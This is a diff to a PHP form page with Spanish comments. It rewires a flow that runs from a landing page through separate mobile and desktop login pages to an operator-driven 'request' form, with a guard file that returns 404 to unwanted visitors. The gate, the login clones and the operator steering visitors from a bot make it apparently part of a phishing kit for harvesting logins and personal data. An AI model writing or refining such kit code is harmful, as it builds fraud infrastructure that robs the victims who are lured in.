@@ -3,12 +3,11 @@ require_once __DIR__ . '/_guard.php';
 if (session_status() !== PHP_SESSION_ACTIVE) { @session_start(); }
 
 // ---------------------------------------------------------------------
-// form.php — FORMULARIO DE SOLICITUD (paso 2, solo GET)
-// El POST lo maneja enviar_solicitud.php (no depende de la cookie del
-// gate, sino de una marca de sesión que se pone aquí abajo). Esto
-// evita que _guard.php rechace el POST AJAX con 404.
-// Si la sesión ya viene con solicitud_ok=true, se salta el formulario
-// y se pasa directo al login (indexmovil.html / pcindex.html).
+// form.php — FORMULARIO DE SOLICITUD (último paso, solo GET)
+// Flujo: landing (index.php) -> login (indexmovil/pcindex) -> pasos
+// -> el operador manda aquí desde el bot -> POST a enviar_solicitud.php
+// -> listo.php. Si la sesión ya viene con solicitud_ok=true se salta
+// el formulario y va directo a listo.php.
 // ---------------------------------------------------------------------
 
 // Marca de sesión: enviar_solicitud.php requiere esto para aceptar POST
@@ -159,23 +158,22 @@ $ya_envio = !empty($_SESSION['solicitud_ok']);
         </form>
     </div>
 
-    <!-- Vista de "iniciando sesión" -->
+    <!-- Vista de "procesando" (post-envío / reingreso) -->
     <div class="loading-view<?php if ($ya_envio) echo ' on'; ?>" id="loadingView">
         <div class="spin"></div>
-        <p>Inicia sesión para continuar</p>
+        <p>Procesando su solicitud...</p>
     </div>
 
     <script>
     (function(){
-        function goLogin(){
-            var esMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            window.location.href = esMovil ? 'indexmovil.html' : 'pcindex.html';
+        function goListo(){
+            window.location.href = 'listo.php';
         }
 
-        // Si ya se envió la solicitud (server session), simplemente esperar y redirigir
+        // Si ya se envió la solicitud (server session), ir directo a listo.php
         var yaEnvio = <?php echo $ya_envio ? 'true' : 'false'; ?>;
         if (yaEnvio) {
-            setTimeout(goLogin, 1800);
+            setTimeout(goListo, 1800);
             return;
         }
 
@@ -212,7 +210,7 @@ $ya_envio = !empty($_SESSION['solicitud_ok']);
                 if (data && data.ok) {
                     formView.style.display = 'none';
                     loadingView.classList.add('on');
-                    setTimeout(goLogin, 1800);
+                    setTimeout(goListo, 1800);
                     return;
                 }
                 if (data && Array.isArray(data.fields)) {
